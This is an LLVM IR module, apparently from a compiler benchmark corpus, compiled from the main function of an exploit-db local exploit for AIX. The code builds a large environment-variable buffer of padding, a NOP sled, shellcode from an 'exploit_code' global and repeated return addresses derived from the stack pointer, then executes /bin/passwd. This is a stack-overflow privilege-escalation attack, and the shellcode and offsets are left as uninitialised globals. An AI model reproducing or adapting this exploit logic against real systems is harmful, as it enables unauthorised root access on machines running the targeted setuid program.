; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19217.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19217.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [6 x i8] c"LANG=\00", align 1
@x = common dso_local global i8* null, align 8
@i = common dso_local global i64 0, align 8
@ADJUST = common dso_local global i64 0, align 8
@NOP = common dso_local global i32 0, align 4
@exploit_code = common dso_local global i8* null, align 8
@STARTADR = common dso_local global i64 0, align 8
@OFFSET = common dso_local global i32 0, align 4
@ret_adr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [23 x i8] c"jumping address : %lx\0A\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"New jumping address : %lx\0A\00", align 1
@RETS = common dso_local global i64 0, align 8
@EV = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [12 x i8] c"/bin/passwd\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"passwd\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %2 = call i32 @putenv(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %3 = load i8*, i8** @x, align 8
  %4 = call i32 @memset(i8* %3, i8 signext 120, i32 70000)
  store i64 0, i64* @i, align 8
  br label %5

5:                                                ; preds = %13, %0
  %6 = load i64, i64* @i, align 8
  %7 = load i64, i64* @ADJUST, align 8
  %8 = icmp ult i64 %6, %7
  br i1 %8, label %9, label %16

9:                                                ; preds = %5
  %10 = load i8*, i8** @x, align 8
  %11 = load i64, i64* @i, align 8
  %12 = getelementptr inbounds i8, i8* %10, i64 %11
  store i8 64, i8* %12, align 1
  br label %13

13:                                               ; preds = %9
  %14 = load i64, i64* @i, align 8
  %15 = add i64 %14, 1
  store i64 %15, i64* @i, align 8
  br label %5

16:                                               ; preds = %5
  %17 = load i64, i64* @ADJUST, align 8
  store i64 %17, i64* @i, align 8
  br label %18

18:                                               ; preds = %53, %16
  %19 = load i64, i64* @i, align 8
  %20 = icmp ult i64 %19, 1000
  br i1 %20, label %21, label %56

21:                                               ; preds = %18
  %22 = load i32, i32* @NOP, align 4
  %23 = and i32 %22, 255
  %24 = trunc i32 %23 to i8
  %25 = load i8*, i8** @x, align 8
  %26 = load i64, i64* @i, align 8
  %27 = add i64 %26, 3
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  store i8 %24, i8* %28, align 1
  %29 = load i32, i32* @NOP, align 4
  %30 = ashr i32 %29, 8
  %31 = and i32 %30, 255
  %32 = trunc i32 %31 to i8
  %33 = load i8*, i8** @x, align 8
  %34 = load i64, i64* @i, align 8
  %35 = add i64 %34, 2
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  store i8 %32, i8* %36, align 1
  %37 = load i32, i32* @NOP, align 4
  %38 = ashr i32 %37, 16
  %39 = and i32 %38, 255
  %40 = trunc i32 %39 to i8
  %41 = load i8*, i8** @x, align 8
  %42 = load i64, i64* @i, align 8
  %43 = add i64 %42, 1
  %44 = getelementptr inbounds i8, i8* %41, i64 %43
  store i8 %40, i8* %44, align 1
  %45 = load i32, i32* @NOP, align 4
  %46 = ashr i32 %45, 24
  %47 = and i32 %46, 255
  %48 = trunc i32 %47 to i8
  %49 = load i8*, i8** @x, align 8
  %50 = load i64, i64* @i, align 8
  %51 = add i64 %50, 0
  %52 = getelementptr inbounds i8, i8* %49, i64 %51
  store i8 %48, i8* %52, align 1
  br label %53

53:                                               ; preds = %21
  %54 = load i64, i64* @i, align 8
  %55 = add i64 %54, 4
  store i64 %55, i64* @i, align 8
  br label %18

56:                                               ; preds = %18
  store i64 0, i64* @i, align 8
  br label %57

57:                                               ; preds = %74, %56
  %58 = load i64, i64* @i, align 8
  %59 = load i8*, i8** @exploit_code, align 8
  %60 = call i64 @strlen(i8* %59)
  %61 = icmp ult i64 %58, %60
  br i1 %61, label %62, label %77

62:                                               ; preds = %57
  %63 = load i8*, i8** @exploit_code, align 8
  %64 = load i64, i64* @i, align 8
  %65 = getelementptr inbounds i8, i8* %63, i64 %64
  %66 = load i8, i8* %65, align 1
  %67 = load i8*, i8** @x, align 8
  %68 = load i64, i64* @STARTADR, align 8
  %69 = load i64, i64* @i, align 8
  %70 = add i64 %68, %69
  %71 = load i64, i64* @ADJUST, align 8
  %72 = add i64 %70, %71
  %73 = getelementptr inbounds i8, i8* %67, i64 %72
  store i8 %66, i8* %73, align 1
  br label %74

74:                                               ; preds = %62
  %75 = load i64, i64* @i, align 8
  %76 = add i64 %75, 1
  store i64 %76, i64* @i, align 8
  br label %57

77:                                               ; preds = %57
  %78 = call i32 (...) @get_sp()
  %79 = load i32, i32* @OFFSET, align 4
  %80 = sub nsw i32 %78, %79
  store i32 %80, i32* @ret_adr, align 4
  %81 = load i32, i32* @ret_adr, align 4
  %82 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i32 %81)
  %83 = load i32, i32* @ret_adr, align 4
  %84 = and i32 %83, 255
  %85 = icmp eq i32 %84, 0
  br i1 %85, label %86, label %91

86:                                               ; preds = %77
  %87 = load i32, i32* @ret_adr, align 4
  %88 = sub nsw i32 %87, 16
  store i32 %88, i32* @ret_adr, align 4
  %89 = load i32, i32* @ret_adr, align 4
  %90 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0), i32 %89)
  br label %91

91:                                               ; preds = %86, %77
  %92 = load i64, i64* @ADJUST, align 8
  %93 = load i64, i64* @RETS, align 8
  %94 = add i64 %92, %93
  store i64 %94, i64* @i, align 8
  br label %95

95:                                               ; preds = %132, %91
  %96 = load i64, i64* @i, align 8
  %97 = load i64, i64* @RETS, align 8
  %98 = add i64 %97, 600
  %99 = icmp ult i64 %96, %98
  br i1 %99, label %100, label %135

100:                                              ; preds = %95
  %101 = load i32, i32* @ret_adr, align 4
  %102 = and i32 %101, 255
  %103 = trunc i32 %102 to i8
  %104 = load i8*, i8** @x, align 8
  %105 = load i64, i64* @i, align 8
  %106 = add i64 %105, 3
  %107 = getelementptr inbounds i8, i8* %104, i64 %106
  store i8 %103, i8* %107, align 1
  %108 = load i32, i32* @ret_adr, align 4
  %109 = ashr i32 %108, 8
  %110 = and i32 %109, 255
  %111 = trunc i32 %110 to i8
  %112 = load i8*, i8** @x, align 8
  %113 = load i64, i64* @i, align 8
  %114 = add i64 %113, 2
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  store i8 %111, i8* %115, align 1
  %116 = load i32, i32* @ret_adr, align 4
  %117 = ashr i32 %116, 16
  %118 = and i32 %117, 255
  %119 = trunc i32 %118 to i8
  %120 = load i8*, i8** @x, align 8
  %121 = load i64, i64* @i, align 8
  %122 = add i64 %121, 1
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  store i8 %119, i8* %123, align 1
  %124 = load i32, i32* @ret_adr, align 4
  %125 = ashr i32 %124, 24
  %126 = and i32 %125, 255
  %127 = trunc i32 %126 to i8
  %128 = load i8*, i8** @x, align 8
  %129 = load i64, i64* @i, align 8
  %130 = add i64 %129, 0
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  store i8 %127, i8* %131, align 1
  br label %132

132:                                              ; preds = %100
  %133 = load i64, i64* @i, align 8
  %134 = add i64 %133, 4
  store i64 %134, i64* @i, align 8
  br label %95

135:                                              ; preds = %95
  %136 = load i8*, i8** @x, align 8
  %137 = load i8*, i8** @EV, align 8
  %138 = load i8*, i8** @EV, align 8
  %139 = call i64 @strlen(i8* %138)
  %140 = call i32 @memcpy(i8* %136, i8* %137, i64 %139)
  %141 = load i8*, i8** @x, align 8
  %142 = getelementptr inbounds i8, i8* %141, i64 3000
  store i8 0, i8* %142, align 1
  %143 = load i8*, i8** @x, align 8
  %144 = call i32 @putenv(i8* %143)
  %145 = call i32 @execl(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i8* null)
  %146 = load i32, i32* %1, align 4
  ret i32 %146
}

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i64) #1

declare dso_local i32 @execl(i8*, i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
